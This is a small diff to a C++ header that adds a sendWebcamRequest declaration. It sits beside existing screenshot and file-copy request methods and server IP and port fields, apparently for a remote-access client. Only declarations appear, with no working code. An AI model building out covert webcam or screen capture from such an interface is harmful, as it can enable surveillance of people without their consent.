@@ -20,6 +20,8 @@ public:
     bool sendScreenshotRequest();
     bool sendFileCopyRequest(const std::string& sourceFileName, const std::string& destinationFileName);
 
+    bool sendWebcamRequest(); 
+
 private:
     std::string serverIP;
     int port;
